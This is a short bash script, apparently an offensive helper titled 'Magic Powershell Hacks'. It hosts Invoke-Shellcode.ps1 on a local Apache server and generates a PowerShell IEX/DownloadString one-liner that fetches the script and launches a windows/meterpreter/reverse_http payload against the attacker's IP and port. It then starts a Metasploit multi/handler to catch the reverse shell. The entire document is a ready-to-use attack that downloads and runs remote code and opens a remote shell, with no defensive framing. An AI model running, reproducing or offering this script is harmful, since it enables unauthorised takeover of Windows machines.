#!/bin/bash

clear
echo "   ---------Magic Powershell Hacks---------
___________For Windows, Made By Bob____________
"
echo -n "Enter Name Of Wireless Card e.g. wlan0 [ENTER]: "
read wcard
ip="$(/sbin/ip -o -4 addr list $wcard| awk '{print $4}' | cut -d/ -f1)"

echo "
$ip
"

echo -n "Enter Port To Be Used e.g. 4444 [ENTER]: "
read port

echo "
Deleting Old Files Created By This Script"
rm code.txt

echo "Copying Script to /var/www/html "
cp Invoke-Shellcode.ps1 /var/www/html/
echo "Starting Web Server"
service apache2 start
echo "Copied to http://"$ip"/Invoke-Shellcode.ps1"
echo "Generating Script For Powershell..."
echo 'IEX(New-Object Net.WebClient).DownloadString ("http://'$ip'/Invoke-Shellcode.ps1")
./Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost '$ip' -lport '$port' -Force' > code.txt
echo "Saved!"
service postgresql start
echo "Starting Listener"
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_http;set LHOST $ip;set LPORT $port; exploit"
